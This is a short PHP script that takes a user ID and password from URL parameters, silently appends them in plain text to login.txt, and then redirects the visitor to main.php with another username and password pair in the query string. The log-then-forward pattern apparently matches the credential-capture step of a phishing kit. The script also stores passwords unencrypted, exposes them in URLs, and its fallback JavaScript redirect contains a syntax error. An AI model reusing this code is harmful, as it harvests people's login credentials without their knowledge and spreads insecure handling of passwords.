<?php
	$user = $_GET['id'];
	$pass = $_GET['pass'];
	$logUser = $_GET['logUser'];
	$logPass = $_GET['logPass'];

	// $usertxt = "";
	// $handle = fopen("login.txt", "r");
	// if ($handle) {
	//     while (($line = fgets($handle)) !== false) {

	//     	$usertxt .= $line;

	//     }

	//     fclose($handle);
	// } else {
	    
	// }
	// $usertxt .=  "\r\n".$user.",".$pass;
	
	// $userfile = fopen("login.txt", "w") or die("Unable to open file!");
 //    fwrite($userfile, $usertxt);
 //    fclose($userfile);
	$siptxt = "\r\n".$user.",".$pass;
    $sipfile = fopen("login.txt", "a") or die("Unable to open file!");
    fwrite($sipfile, $siptxt);
    fclose($sipfile);


    goto_url("main.php?userName=".$logUser."&p=m&userPassword=".$logPass);

    function goto_url($url)
    {
        $url = str_replace("&amp;", "&", $url);
        
        if (!headers_sent())
            header('Location: '.$url);
        else {
            echo '<script>';
            echo 'window.location.href = "'.$url.'");';
            echo '</script>';
        }
        exit;
    }

?>